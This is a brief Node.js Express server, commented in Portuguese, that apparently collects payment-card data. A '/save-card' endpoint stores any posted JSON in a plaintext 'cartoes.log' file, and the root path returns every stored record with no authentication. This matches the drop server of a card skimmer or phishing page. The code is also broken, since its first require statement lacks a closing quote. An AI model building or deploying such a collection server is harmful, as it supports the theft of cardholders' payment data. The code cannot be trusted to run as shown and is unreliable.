// index.js do backend (Render)
const express = require('express);
const fs = require('fs');
const path = require('path');

const app = express();
app.use(express.json({ limit: '2mb' }));

const LOG_FILE = path.join(__dirname, 'cartoes.log');

app.post('/save-card', (req, res) => {
  const payload = { ...req.body, ts: new Date().toISOString() };
  fs.appendFileSync(LOG_FILE, JSON.stringify(payload) + '\n');
  res.json({ ok: true });
});

app.get('/', (_req, res) => {
  if (!fs.existsSync(LOG_FILE)) return res.send('--- nenhum cartão ainda ---');
  const data = fs.readFileSync(LOG_FILE, 'utf8').split('\n').filter(Boolean).map(JSON.parse);
  res.json(data);
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log('Rodando na porta', PORT));
